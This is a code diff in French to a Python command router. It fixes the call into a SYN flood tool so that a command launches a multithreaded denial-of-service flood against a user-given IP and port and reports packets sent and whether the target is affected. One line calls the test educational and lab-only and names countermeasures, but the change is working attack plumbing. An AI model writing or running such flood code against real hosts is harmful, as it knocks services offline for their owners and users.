@@ -69,14 +69,31 @@ class CommandRouter:
             if m:
                 duree = int(m.group(1))
             try:
-                flooder = SynFlood(ip, port, threads=50)
-                total = flooder.start(duree=duree)
+                # API correcte de dos_tools.py : target_ip/target_port/duration/threads + .run()
+                flooder = SynFlood(
+                    target_ip=ip,
+                    target_port=port,
+                    duration=duree,
+                    threads=50,
+                )
+                resultat = flooder.run()
+
+                # run() peut renvoyer {"erreur": ...} si scapy manque
+                if "erreur" in resultat:
+                    return f"⚠️ {resultat['erreur']}"
+
+                envoyes = resultat.get("envoyes", 0)
+                debit = resultat.get("debit_pkt_s", 0)
+                erreurs = resultat.get("erreurs", 0)
+                statut = "🟡 Cible potentiellement affectée" if envoyes > 0 else "❌ Aucun paquet envoyé"
                 return (
                     f"## 🚀 SYN Flood exécuté\n\n"
                     f"- **Cible :** `{ip}:{port}`\n"
                     f"- **Durée :** {duree}s\n"
-                    f"- **Paquets :** {total:,}\n"
-                    f"- **Débit :** ~{total // max(duree, 1):,} pkt/s\n\n"
+                    f"- **Paquets :** {envoyes:,}\n"
+                    f"- **Débit :** ~{debit:,} pkt/s\n"
+                    f"- **Erreurs d'envoi :** {erreurs}\n"
+                    f"- **Statut :** {statut}\n\n"
                     f"**Interprétation :** avec des IP source aléatoires, la cible remplit sa table "
                     f"de connexions SYN. Ce test est éducatif — lab uniquement.\n"
                     f"**Contre-mesures :** syn cookies, rate limiting, pare-feu."
